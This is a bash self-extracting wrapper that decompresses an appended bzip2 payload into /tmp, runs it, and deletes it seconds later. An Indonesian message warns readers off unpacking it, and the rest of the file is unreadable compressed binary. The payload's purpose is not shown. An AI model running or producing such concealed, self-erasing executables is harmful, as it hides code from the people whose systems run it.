#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�7 @_�u����?�������PD@  PL{�t�2�v�;��$����ѥ=F��b���bh��� ��������	�D��hi�&� �@  � D$���z���z�����OQ��� h4h� �C&�d� � h2h 4  � �I$25�4Se4�F�M6��d�I�Ѡ@4�`� ���vn;<�:��1�i*g��(j�RNxPA'a����eb]g����8d��!���?(�' 7��V���3�
(,(�a��t7}���㊳: �s�q��P*8�nm�c��]2m2�9���͏L%0�b\8&��D�GN�����C�7�k�S��Z?Z�n������v�a:�\��hƛ>��b�.f�Y�^xUD���m+�a��Q�Fe�!1ƓT�&R�FmtjFO��+�M��9%X̄��ۿ�1��VG�k���7���R�������rRj�q��p�*�B����͛,tg���}��{��tQ���;RV�DJ��d��23��X�vOS�.1��Ò���K��S[kY7/@��(mF^� ��Jo��D�v�j��ZXL�楛0mB�u�#ԟ�gC�`��k�%a��O��'��W�J�q����k`����m�VFC+���ˉ��-��	p�yȐ:��l�"��ʢ5�է����������g���ш�1M�ε��d@b����_� �3Obأ��,g�P���"?ˑ/�w��X�Qa��a{=�x��1�~���3"|+#��b��M)�f�,�:l���'P���8e067[� [Q^u<�R��`�����$�Oʉ�I�Q�X*	I͢�!#�i��"�Y��{٩0@���r�ю�A&_c�x	�C�7�kH\h3VV�����4T�03�i%S��j!�������8`�[
�*�+E���X��Y&q�����ʠ����Ā�����w+;:Q(�ι&�:�Y�iΦ��8c-��B͆���fR��X�K'Y�ҿl�v���D®�J|���yM����
��pܱ���F��D�F�fT2}���uk��$�2|�dg�f!���8m�R�&�[PN�	��Y��k�熁T�y''�ֹhL�@��nܠ����}iV�KڒC���薃�F�멁㕤��WQF2�2EL�Dz�J��$Z��_�Qn��1RLb�fb��Y;dR�C�/��w��\�xpg3|��ʥ�}���KC��Q.�t��J�Ԯ
����X������(Ё�# P�	ޮuke�QqB2j'䒜��I��b�I�	�����Q)�{	Z}!)eZބ�ˍ(��L��=�Ei)���Äl�뙘�T/�|�8�	��&�m�"  Sa�?��H�
���